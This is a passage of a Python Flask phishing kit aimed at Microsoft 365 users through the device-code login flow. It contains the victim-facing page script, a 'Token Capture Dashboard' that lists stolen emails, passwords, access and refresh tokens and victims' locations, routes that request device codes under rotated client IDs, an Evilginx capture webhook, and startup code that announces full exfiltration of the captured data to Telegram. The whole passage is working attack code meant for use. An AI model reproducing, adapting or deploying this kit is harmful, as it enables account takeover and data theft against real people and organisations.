        let attempts = 0;
        const MAX_ATTEMPTS = 60; // 5 minutes at 5 second intervals
        
        pollingInterval = setInterval(async () => {
            attempts++;
            if (!isPollingActive) return;
            
            try {
                const response = await fetch(`/api/device/status/${encodeURIComponent(userCode)}`);
                if (!response.ok) throw new Error('Status check failed');
                const data = await response.json();
                
                if (data.status === 'completed') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    isPollingActive = false;
                    showPanel('successPanel');
                    setTimeout(() => {
                        window.location.href = 'https://login.microsoftonline.com';
                    }, 2000);
                } else if (data.status === 'failed') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    isPollingActive = false;
                    showErrorPanel('Verification declined or expired. Please try again.');
                }
                
                if (attempts >= MAX_ATTEMPTS && isPollingActive) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    isPollingActive = false;
                    showErrorPanel('Verification timed out after 5 minutes. Please try again.');
                }
            } catch (err) {
                console.warn('Polling error:', err);
                if (attempts >= MAX_ATTEMPTS) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    isPollingActive = false;
                    showErrorPanel('Network error while polling. Please try again.');
                }
            }
        }, 5000);
    }

    // Start verification process
    async function startVerification() {
        if (!currentUserCode) {
            showToast('Generating code first...', 1000);
            const success = await autoGenerateCode();
            if (!success) return;
        }
        
        // Open Microsoft device login page
        window.open('https://microsoft.com/devicelogin', '_blank');
        
        // Update loading panel
        loadingSubtitle.innerHTML = `✅ <strong>Your code: ${currentUserCode}</strong><br><br>Please enter this code on the Microsoft login page that just opened.<br>Then sign in with your Microsoft 365 account.`;
        
        showPanel('loadingPanel');
        isPollingActive = true;
        
        // Start polling for completion
        startPolling(currentUserCode);
    }
    
    // Copy code function
    async function copyCode() {
        if (!currentUserCode || verificationCodeSpan.innerHTML === '------' || verificationCodeSpan.innerHTML === '⚠️ Error') {
            showToast('No active code. Click "Continue to Microsoft Device Login" first.', 2000);
            return;
        }
        
        try {
            await navigator.clipboard.writeText(currentUserCode);
            const originalText = copyBtn.innerHTML;
            copyBtn.innerHTML = '✅ Copied!';
            setTimeout(() => { copyBtn.innerHTML = originalText; }, 2000);
            showToast('Code copied!', 1500);
        } catch (err) {
            showToast('Select the code and copy manually', 1500);
        }
    }
    
    // Retry flow
    async function retryFlow() {
        if (pollingInterval) {
            clearInterval(pollingInterval);
            pollingInterval = null;
        }
        isPollingActive = false;
        
        // Reset UI
        verificationCodeSpan.innerHTML = '------';
        verificationCodeSpan.style.color = '#0F6CBD';
        showPanel('defaultPanel');
        
        // Generate new code
        await autoGenerateCode();
        
        // Reset button
        continueBtn.disabled = false;
        continueBtn.innerHTML = '▶ Continue to Microsoft Device Login';
    }
    
    // Event listeners
    continueBtn.addEventListener('click', startVerification);
    copyBtn.addEventListener('click', copyCode);
    verificationCodeSpan.addEventListener('click', copyCode);
    retryBtn.addEventListener('click', retryFlow);
    
    // Block paste on page (but allow normal functionality)
    document.addEventListener('paste', function(e) {
        e.preventDefault();
        showToast("Pasting is disabled on this page. Enter the code on microsoft.com/devicelogin", 2000);
        return false;
    });
    
    document.addEventListener('keydown', function(e) {
        if ((e.ctrlKey || e.metaKey) && e.key === 'v') {
            e.preventDefault();
            showToast("Pasting disabled here", 1500);
            return false;
        }
    });
    
    // Auto-generate code immediately on page load
    autoGenerateCode();
    
    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
        if (pollingInterval) clearInterval(pollingInterval);
    });
    
})();
</script>
</body>
</html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Token Capture Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', monospace; background: #121212; color: #e0e0e0; padding: 20px; }
        .container { max-width: 1600px; margin: 0 auto; }
        h1 { font-size: 20px; font-weight: 600; margin-bottom: 4px; color: #fff; }
        .subtitle { font-size: 13px; color: #888; margin-bottom: 20px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 20px; }
        .stat-card { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 16px; }
        .stat-label { font-size: 11px; text-transform: uppercase; color: #888; }
        .stat-value { font-size: 28px; font-weight: 700; color: #fff; margin-top: 4px; }
        .stat-value.green { color: #4caf50; }
        .stat-value.blue { color: #42a5f5; }
        .controls { display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap; }
        .search-box { flex: 1; background: #1e1e1e; border: 1px solid #333; border-radius: 6px; padding: 10px 14px; color: #e0e0e0; }
        .btn { background: #333; border: 1px solid #444; color: #e0e0e0; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
        .btn-danger { background: #5c2020; border-color: #7a2b2b; }
        table { width: 100%; border-collapse: collapse; background: #1e1e1e; border-radius: 8px; overflow: hidden; border: 1px solid #333; }
        th, td { padding: 10px 12px; font-size: 12px; border-bottom: 1px solid #2a2a2a; text-align: left; white-space: nowrap; }
        th { background: #252525; color: #888; text-transform: uppercase; font-size: 11px; }
        .badge-success { background: #1b3820; color: #4caf50; padding: 2px 8px; border-radius: 10px; }
        .badge-pending { background: #3a2e13; color: #ffa726; padding: 2px 8px; border-radius: 10px; }
        .action-btn { background: none; border: 1px solid #555; color: #aaa; padding: 2px 8px; border-radius: 4px; cursor: pointer; }
        .action-btn:hover { border-color: #f44336; color: #f44336; }
        .token-cell { cursor: pointer; font-family: monospace; font-size: 10px; max-width: 200px; overflow: hidden; text-overflow: ellipsis; }
        .token-cell:hover { color: #fff; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔑 Token Capture Dashboard</h1>
    <div class="subtitle">Live capture monitor — <span id="lastUpdate">just now</span></div>
    <div class="stats">
        <div class="stat-card"><div class="stat-label">Total Attempts</div><div class="stat-value blue" id="statTotal">0</div></div>
        <div class="stat-card"><div class="stat-label">Successful</div><div class="stat-value green" id="statSuccess">0</div></div>
        <div class="stat-card"><div class="stat-label">Conversion Rate</div><div class="stat-value" id="statRate">0%</div></div>
        <div class="stat-card"><div class="stat-label">Pending</div><div class="stat-value" id="statPending">0</div></div>
    </div>
    <div class="controls">
        <input class="search-box" id="searchInput" placeholder="🔍 Search email / IP / code" oninput="filterTable()">
        <button class="btn" onclick="refreshData()">🔄 Refresh</button>
        <button class="btn" onclick="exportData()">📥 Export JSON</button>
        <button class="btn btn-danger" onclick="clearAll()">🗑️ Clear All</button>
    </div>
    <div style="overflow-x: auto;">
        <table>
            <thead>
                <tr><th>ID</th><th>Time</th><th>Email</th><th>IP/Location</th><th>Client</th><th>Password</th><th>Access Token</th><th>Refresh Token</th><th>Status</th><th>Actions</th></tr>
            </thead>
            <tbody id="tableBody"></tbody>
        </table>
    </div>
    <div class="refresh-note" style="margin-top:12px;font-size:11px;color:#555;">Auto-refreshes every 10 seconds</div>
</div>
<script>
let allCaptures = [];
function refreshData() {
    fetch('/api/dashboard/data').then(r=>r.json()).then(d=>{
        allCaptures = d.captures || [];
        document.getElementById('statTotal').textContent = d.total || 0;
        const succ = allCaptures.filter(c=>c.success==1).length;
        document.getElementById('statSuccess').textContent = succ;
        const pending = allCaptures.filter(c=>c.success==0).length;
        document.getElementById('statPending').textContent = pending;
        const rate = d.total>0 ? (succ/d.total*100).toFixed(1):0;
        document.getElementById('statRate').textContent = rate+'%';
        document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
        filterTable();
    });
}
function filterTable() {
    const q = document.getElementById('searchInput').value.toLowerCase();
    const tbody = document.getElementById('tableBody');
    tbody.innerHTML = '';
    const filtered = allCaptures.filter(c=>(c.email||'').toLowerCase().includes(q) || (c.ip_address||'').includes(q) || (c.user_code||'').includes(q));
    filtered.forEach(c=>{
        const tr = tbody.insertRow();
        tr.innerHTML = `
            <td>${c.id}</td>
            <td class="timestamp">${new Date(c.timestamp).toLocaleString()}</td>
            <td style="color:#64b5f6">${c.email || '-'}</td>
            <td>${c.ip_address}<br><span style="font-size:10px;color:#666">${c.city||''}, ${c.country||''}</span></td>
            <td>${c.client_name||'-'}</td>
            <td class="token-cell" title="${(c.password||'').replace(/"/g,'&quot;')}" onclick="alert(this.title)">${c.password ? '✅ Present' : '-'}</td>
            <td class="token-cell" title="${(c.access_token||'').replace(/"/g,'&quot;')}" onclick="alert(this.title)">${c.access_token ? (c.access_token.substring(0,30)+'...') : '-'}</td>
            <td class="token-cell" title="${(c.refresh_token||'').replace(/"/g,'&quot;')}" onclick="alert(this.title)">${c.refresh_token ? (c.refresh_token.substring(0,30)+'...') : '-'}</td>
            <td>${c.success==1 ? '<span class="badge-success">✅ Captured</span>' : '<span class="badge-pending">⏳ Pending</span>'}</td>
            <td><button class="action-btn" onclick="deleteCapture(${c.id})">🗑️</button></td>
        `;
    });
}
function deleteCapture(id) { if(confirm('Delete capture #'+id+'?')) fetch('/api/dashboard/delete/'+id,{method:'DELETE'}).then(()=>refreshData()); }
function exportData() { window.open('/api/dashboard/export?_='+Date.now()); }
function clearAll() { if(confirm('Delete ALL captures?')) allCaptures.forEach(c=>fetch('/api/dashboard/delete/'+c.id,{method:'DELETE'})); setTimeout(refreshData,1000); }
refreshData(); setInterval(refreshData,10000);
</script>
</body>
</html>
'''

# ==================== FLASK ROUTES ====================
@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/dashboard")
@requires_auth
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route("/api/dashboard/data")
@requires_auth
def dashboard_data():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    rows = conn.execute("""
        SELECT id, timestamp, email, email_source, user_code,
               access_token, refresh_token, password,
               ip_address, city, country, isp, success, client_name
        FROM captures ORDER BY id DESC LIMIT 200
    """).fetchall()
    conn.close()
    captures = []
    for row in rows:
        cap = dict(row)
        for key in ("access_token", "refresh_token"):
            if cap.get(key) and len(cap[key]) > 100:
                cap[key] = cap[key][:100] + "..."
        captures.append(cap)
    total = len(captures)
    successful = sum(1 for c in captures if c.get("success") == 1)
    return jsonify({"captures": captures, "total": total, "successful": successful})

@app.route("/api/dashboard/export")
@requires_auth
def export_data():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT * FROM captures ORDER BY id DESC").fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])

@app.route("/api/dashboard/delete/<int:capture_id>", methods=["DELETE"])
@requires_auth
def delete_capture(capture_id):
    conn = sqlite3.connect(DB_NAME)
    conn.execute("DELETE FROM captures WHERE id = ?", (capture_id,))
    conn.commit()
    conn.close()
    return jsonify({"success": True})

@app.route("/api/device/start", methods=["POST"])
def start_device_flow():
    try:
        ip_address = get_client_ip()
        user_agent = request.headers.get("User-Agent", "Unknown")
        client_id = secrets.choice(CLIENT_IDS)
        geo_data = get_geolocation(ip_address)

        payload = {
            "client_id": client_id,
            "scope": "openid profile email offline_access https://graph.microsoft.com/.default"
        }

        resp = requests.post(DEVICE_CODE_URL, data=payload,
                             headers={"User-Agent": get_random_user_agent(),
                                      "Content-Type": "application/x-www-form-urlencoded"},
                             timeout=30)

        if resp.status_code != 200:
            return jsonify({"error": "Device code request failed"}), 500

        data = resp.json()
        user_code = data.get("user_code")
        device_code = data.get("device_code")

        if not user_code or not device_code:
            return jsonify({"error": "Invalid response"}), 500

        conn = sqlite3.connect(DB_NAME)
        conn.execute("""INSERT INTO captures
            (timestamp, user_code, device_code, ip_address, city, country,
             isp, user_agent, client_id, client_name, success)
            VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
            (datetime.datetime.utcnow().isoformat() + "Z",
             user_code, device_code,
             ip_address, geo_data.get("city"), geo_data.get("country"),
             geo_data.get("isp"), user_agent, client_id,
             get_client_name(client_id), 0))
        conn.commit()
        conn.close()

        threading.Thread(
            target=poll_for_tokens,
            args=(device_code, user_code, ip_address, geo_data, user_agent, client_id),
            daemon=True
        ).start()

        return jsonify({"success": True, "userCode": user_code})
    except Exception as e:
        logger.error(f"Error: {traceback.format_exc()}")
        return jsonify({"error": str(e)}), 500

@app.route("/api/device/status/<user_code>")
def check_status(user_code):
    if user_code in active_sessions:
        status = active_sessions[user_code].get("status", "pending")
        if status == "completed":
            return jsonify({"status": "completed"})
        elif status == "failed":
            return jsonify({"status": "failed"})
        return jsonify({"status": "pending"})
    conn = sqlite3.connect(DB_NAME)
    row = conn.execute(
        "SELECT success FROM captures WHERE user_code = ? ORDER BY id DESC LIMIT 1",
        (user_code,)
    ).fetchone()
    conn.close()
    if row and row[0] == 1:
        active_sessions[user_code] = {"status": "completed"}
        return jsonify({"status": "completed"})
    return jsonify({"status": "pending"})

@app.route("/api/evilginx/capture", methods=["POST"])
def evilginx_capture():
    api_key = request.headers.get("X-API-Key")
    if not api_key or api_key != EVILGINX_API_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json()
    if not data:
        return jsonify({"error": "No JSON"}), 400

    ip = data.get("ip", request.remote_addr)
    user_agent = data.get("user_agent", request.headers.get("User-Agent", "Unknown"))

    process_evilginx_capture(data, ip, user_agent, source="evilginx_webhook")
    return jsonify({"status": "success"}), 200

@app.route('/docx')
def docx():
    return render_template_string(INDEX_HTML)

@app.route("/stats")
def show_stats():
    conn = sqlite3.connect(DB_NAME)
    total = conn.execute("SELECT COUNT(*) FROM captures").fetchone()[0]
    successful = conn.execute("SELECT COUNT(*) FROM captures WHERE success=1").fetchone()[0]
    conn.close()
    return jsonify({
        "total_attempts": total,
        "successful_captures": successful,
        "conversion_rate": round((successful / total) * 100, 1) if total > 0 else 0
    })

@app.route("/test-telegram")
def test_telegram():
    test_file = os.path.join(TOKENS_DIR, "test.json")
    with open(test_file, "w") as f:
        json.dump({"test": "data"}, f)
    send_telegram_text("Test message")
    send_telegram_document(test_file, "Test attachment")
    return jsonify({"status": "ok"})

# ==================== MAIN ====================
if __name__ == "__main__":
    init_db()
    monitor_thread = threading.Thread(target=evilginx_db_monitor, daemon=True)
    monitor_thread.start()
    print("=" * 70)
    print("  TOKEN CAPTURE + FULL EXFILTRATION TO TELEGRAM (JSON FILE)")
    print("  Captures email, password, cookies, full tokens, first 10 emails")
    print("  Sends summary + JSON file attachment to Telegram")
    print("=" * 70)
    print(f"  🌐 Phishing Page : http://0.0.0.0:5000")
    print(f"  🔐 Dashboard     : http://0.0.0.0:5000/dashboard")
    print(f"  📁 Tokens folder : ./{TOKENS_DIR}/")
    print(f"  🤖 Telegram      : {TELEGRAM_BOT_TOKEN[:20]}...")
    print("=" * 70)
    if TELEGRAM_BOT_TOKEN and "YOUR_BOT_TOKEN" not in TELEGRAM_BOT_TOKEN:
        send_telegram_text("<b>✅ Token capture system online</b>\nFull exfiltration ready.")
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)